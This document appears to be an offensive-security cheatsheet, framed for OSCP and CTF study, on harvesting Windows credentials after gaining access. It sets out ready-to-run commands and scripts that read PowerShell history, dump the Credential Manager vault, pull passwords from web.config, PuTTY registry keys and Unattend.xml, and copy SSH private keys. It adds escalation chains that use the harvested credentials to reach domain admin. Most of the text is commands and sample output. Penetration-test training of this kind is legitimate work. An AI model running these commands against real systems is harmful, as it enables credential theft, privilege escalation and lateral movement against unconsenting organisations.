# Windows Credential Harvesting Cheatsheet

**Knowledge Score:** 92/100

---

## Overview

Windows systems store credentials in various locations. Understanding where credentials are stored and how to extract them is essential for privilege escalation and lateral movement. This cheatsheet covers enumeration and extraction of Windows credentials from multiple sources.

**Why It Matters:**
- Credentials enable horizontal and vertical privilege escalation
- Many systems store credentials in plain text or weakly protected locations
- Essential for post-exploitation and maintaining persistent access
- Frequently tested in OSCP Windows privilege escalation modules

---

## Core Concepts

### Credential Storage on Windows

Windows stores credentials in multiple locations:

1. **PowerShell History** - Command history including passwords
2. **Saved Credentials** - cmdkey, Windows Credential Manager
3. **Application Configuration** - IIS web.config, application settings
4. **Registry** - PuTTY, VPN, RDP connections
5. **Unattended Setup Files** - XML files from automated deployments
6. **SSH Keys** - Private key files in user home directories
7. **Browser Stored Passwords** - Chrome, Firefox credential storage
8. **Active Directory** - Group Policy, LDAP queries

**Key principle:** Compromised user account = access to their stored credentials = escalation/lateral movement.

---

## Enumeration & Harvesting

### Method 1: PowerShell History

PowerShell maintains command history. If users type passwords in commands, they're recorded.

**Location:**
```
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**Harvesting:**
```cmd
# From Windows command prompt
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# From PowerShell
Get-Content $PROFILE\..\ConsoleHost_history.txt
```

**Example output:**
```
net user admin NewPassword123! /add
Get-ADUser -Identity admin -Credential (Get-Credential)
invoke-command -computername server -credential (New-Object System.Management.Automation.PSCredential('domain\admin', (ConvertTo-SecureString 'SecurePass@123' -AsPlainText -Force)))
```

**Knowledge Pattern:** PowerShell history often contains plaintext credentials. Users frequently type passwords directly in commands.

---

### Method 2: Saved Windows Credentials

Windows Credential Manager stores credentials for various services.

**Enumeration:**
```cmd
# List all saved credentials
cmdkey /list

# Example output:
# Target: Domain Credentials
#   Type: Domain Password
#   User: DOMAIN\admin
#
# Target: Local Credentials
#   Type: Local Password
#   User: localadmin
```

**Exploitation:**
```cmd
# Use saved credentials with runas
runas /savecred /user:admin cmd.exe
# Prompts for password only once, then cached

# Or directly spawn elevated shell
runas /savecred /user:DOMAIN\admin powershell.exe
```

**Advanced credential extraction:**
```powershell
# If you have admin access, extract stored credentials
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | % { $_.RetrievePassword(); $_ }
```

**Knowledge Pattern:** Saved credentials enable privilege escalation without knowing actual passwords. Runas with /savecred is a quick escalation path.

---

### Method 3: IIS Configuration Credentials

IIS stores connection strings and application pool credentials in web.config files.

**Location:**
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
Application-specific folders
```

**Harvesting:**
```cmd
# Search for connection strings
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

# Example output:
# <connectionString="server=dbserver.internal;User Id=sa;Password=DatabasePass@123;"/>
# <connectionString="Server=.\SQLEXPRESS;Database=AppDB;User Id=app_user;Password=AppPassword!@#"/>
```

**PowerShell search:**
```powershell
# Find all web.config files
Get-ChildItem -Path "C:\" -Recurse -Filter "web.config" 2>/dev/null |
  ForEach-Object { 
    Select-String -Path $_.FullName -Pattern "password|connectionString" -ErrorAction SilentlyContinue
  }
```

**Knowledge Pattern:** IIS often has database credentials in web.config. Database compromise = access to application data and potentially domain accounts.

---

### Method 4: PuTTY SSH Configuration

PuTTY stores session information in registry, including proxy credentials.

**Location:**
```
HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\
```

**Harvesting:**
```cmd
# Search for PuTTY sessions
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /s

# Look for proxy credentials
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

# Example output:
# ProxyUsername    REG_SZ    admin
# ProxyPassword    REG_SZ    ProxyPass123
# ProxyHostName    REG_SZ    proxy.internal
```

**PowerShell variant:**
```powershell
Get-Item "HKCU:\Software\SimonTatham\PuTTY\Sessions\" -ErrorAction SilentlyContinue |
  ForEach-Object {
    Get-ItemProperty -Path $_.PsPath | Select-Object ProxyUsername,ProxyPassword,HostName
  }
```

**Knowledge Pattern:** PuTTY proxy credentials stored in plaintext registry. Often contains credentials for critical infrastructure.

---

### Method 5: Windows Unattended Setup Files

Automated Windows deployments store credentials in XML files.

**Locations:**
```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\System32\Sysprep\Unattend.xml
C:\Windows\System32\Sysprep\Panther\Unattend.xml
```

**Harvesting:**
```cmd
# Find unattend files
dir /s C:\Unattend.xml
dir /s C:\Windows\Panther\Unattend.xml

# View content
type C:\Windows\Panther\Unattend.xml

# Search for passwords
findstr /I password C:\Windows\Panther\Unattend.xml
```

**Example output:**
```xml
<Password>
  <Value>Admin@123456</Value>
  <PlainText>true</PlainText>
</Password>

<LocalAccount>
  <Password>
    <Value>LocalAdminPass@2024</Value>
  </Password>
  <Name>Administrator</Name>
</LocalAccount>
```

**PowerShell parsing:**
```powershell
[xml]$unattend = Get-Content C:\Windows\Panther\Unattend.xml
$unattend.unattend.settings.component.UserAccounts
```

**Knowledge Pattern:** Unattend files contain setup account credentials. Often shared across entire organization's deployments.

---

### Method 6: SSH Keys in User Directories

Private SSH keys are frequently stored in user home directories.

**Locations:**
```
C:\Users\username\.ssh\id_rsa
C:\Users\username\.ssh\id_ed25519
C:\Users\username\.ssh\known_hosts
C:\ProgramData\ssh\
```

**Harvesting:**
```cmd
# Find SSH keys
dir /s C:\Users\*\.ssh\id_rsa
dir /s C:\Users\*\.ssh\id_ed25519

# View key content
type C:\Users\admin\.ssh\id_rsa
```

**PowerShell search:**
```powershell
Get-ChildItem -Path "C:\Users" -Recurse -Filter "id_rsa" -ErrorAction SilentlyContinue |
  ForEach-Object { 
    Write-Host "Found: $($_.FullName)"
    Get-Content $_.FullName
  }
```

**Exploitation:**
```bash
# On attacker machine
# Save the private key
# Use it for SSH access
ssh -i id_rsa admin@target.internal

# Or use with tools like PuTTY, Pageant
```

**Knowledge Pattern:** SSH keys enable passwordless authentication. Private keys = lateral movement to other systems.

---

### Method 7: Browser Stored Passwords

Browsers cache credentials locally (Chrome, Firefox, Edge).

**Chrome Location:**
```
C:\Users\username\AppData\Local\Google\Chrome\User Data\Default\Login Data
```

**Firefox Location:**
```
C:\Users\username\AppData\Roaming\Mozilla\Firefox\Profiles\*\logins.json
```

**Harvesting (requires decryption):**
```powershell
# Chrome extraction (complex, requires crypto keys)
# Use tools like:
# - ChromePass (NirSoft)
# - lazagne

# Firefox (simpler for local machine)
# If on local machine with access, firefox stores master password
# Master password = access to all stored credentials
```

**Knowledge Pattern:** Browser credentials include email, banking, internal systems. Master password access = complete credential store compromise.

---

## Attack Escalation Chain

### Low-Level Privilege (Standard User)

```
Check PowerShell history
↓
Find database credentials in web.config
↓
Connect to database with harvested credentials
↓
Extract domain user credentials from application database
↓
Use domain credentials for lateral movement
```

### Medium-Level Privilege (Local Admin)

```
Query Credential Manager (cmdkey /list)
↓
Use saved credentials with runas
↓
Execute commands as other users
↓
Escalate to domain admin if credentials exist
```

### Full Escalation (Domain Compromise)

```
Extract Unattend.xml credentials
↓
Credentials may be Domain Admin (common in setup files)
↓
Use Domain Admin for full domain control
↓
Pivot to other systems using harvested credentials
```

---

## Real-World Extraction Workflow

### Scenario 1: Standard User to Admin

**Step 1: Check PowerShell History**
```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
# Output: runas /user:admin SomeCommand Password@123
```

**Step 2: Extract from Command**
```
Username: admin
Password: Password@123
```

**Step 3: Escalate**
```cmd
runas /user:admin cmd.exe
# Enter password when prompted
```

### Scenario 2: Web Server to Database

**Step 1: Find web.config**
```powershell
Get-ChildItem -Path "C:\" -Recurse -Filter "web.config" | Where-Object {
  Select-String -Path $_.FullName -Pattern "password" -Quiet
}
```

**Step 2: Extract Connection String**
```xml
<connectionString="server=sql.internal;User Id=webapp_user;Password=WebAppDB@Pass123"/>
```

**Step 3: Connect to Database**
```cmd
sqlcmd -S sql.internal -U webapp_user -P WebAppDB@Pass123

# Query for domain users
SELECT * FROM AspNetUsers WHERE Email LIKE '%@domain.com'
```

### Scenario 3: Unattend.xml to Domain Admin

**Step 1: Find Unattend.xml**
```cmd
dir /s C:\Windows\Panther\Unattend.xml
```

**Step 2: Extract Credentials**
```xml
<UserAccounts>
  <AdministratorPassword>
    <Value>DomainAdminPass@123</Value>
  </AdministratorPassword>
</UserAccounts>
```

**Step 3: Escalate**
```cmd
runas /user:DOMAIN\Administrator cmd.exe
# Password: DomainAdminPass@123

# Confirm domain admin
whoami
# DOMAIN\Administrator

net user
# Verify admin rights
```

---

## Detection & Verification

### Verify Credential Access

```cmd
# Test with extracted credentials
net use \\server\share /user:domain\admin password

# Query domain information
net group "Domain Admins" /domain

# List shares on remote system
net view \\server

# Confirm elevated privileges
whoami /priv
```

---

## Best Practices

### During Enumeration
1. Check PowerShell history first (easiest)
2. Always search for web.config files (common on web servers)
3. Look for unattend files (often exist on older systems)
4. Check registry for PuTTY/VPN credentials
5. Search user directories for SSH keys

### During Extraction
1. Copy files to safe location before analysis
2. Use PowerShell for easier parsing of XML
3. Test credentials before using in reports
4. Note credential age (old passwords may not work)
5. Check for multi-factor authentication (MFA) requirements

### Common Mistakes
- Only checking obvious locations (miss application-specific folders)
- Not checking registry for cached credentials
- Assuming passwords contain complexity (many don't)
- Not testing credentials immediately (may have changed)
- Missing browser password stores (often overlooked)

---

## Credential Storage Locations Quick Reference

| Source | Location | Format | Access Level |
|--------|----------|--------|--------------|
| PowerShell History | %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ | Text | User |
| cmdkey | Registry/Credential Manager | Encrypted (can be extracted) | Admin |
| IIS web.config | C:\inetpub\wwwroot\ | XML (plain text) | Web Server permissions |
| PuTTY Registry | HKCU:\Software\SimonTatham\PuTTY\ | Plain text registry | User |
| Unattend.xml | C:\Windows\Panther\ | XML (plain text) | Admin |
| SSH Keys | C:\Users\*\.ssh\ | PEM (encrypted or plaintext) | User |
| Browser Data | C:\Users\*\AppData\Local\Google\Chrome\ | Encrypted database | User |

---

## Related Cheatsheets

- [[Windows-User-Enumeration]] - Identifying target users
- [[IIS-WebDAV-Exploitation]] - Web server exploitation
- [[Linux-Reverse-Shell-Techniques]] - Post-exploitation techniques
- [[Linux-Enumeration-Find]] - File system enumeration

---

## Quick Reference Commands

```cmd
# PowerShell history
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# Saved credentials
cmdkey /list

# IIS web.config
type C:\inetpub\wwwroot\web.config | findstr password

# PuTTY registry
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /s

# Find unattend files
dir /s C:\Windows\Panther\Unattend.xml

# Search for SSH keys
dir /s C:\Users\*\.ssh\id_rsa

# Find all web.config files
dir /s C:\*\web.config

# Use extracted credentials
runas /user:admin cmd.exe
```

---

## References & Further Study

### Offensive Security Resources
- [OSCP Windows Privilege Escalation](https://www.offensive-security.com/pwk-oscp/)
- [HackTricks - Windows Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-privilege-escalation)

### Tools for Credential Extraction
- [Lazagne - Multi-Platform Credential Dumper](https://github.com/AlessandroZ/LaZagne)
- [Mimikatz - Credential Extraction Tool](https://github.com/gentilkiwi/mimikatz)
- [ChromePass - Chrome Password Extractor](https://www.nirsoft.net/utils/chromepass.html)

### CTF & Practice
- TryHackMe: Windows Privilege Escalation room
- HackTheBox: Windows machines with credential harvesting
- Multiple machines focusing on post-exploitation

---

## Changelog

**v1.0** - Initial cheatsheet with 7 credential harvesting methods, escalation chains, and detection techniques
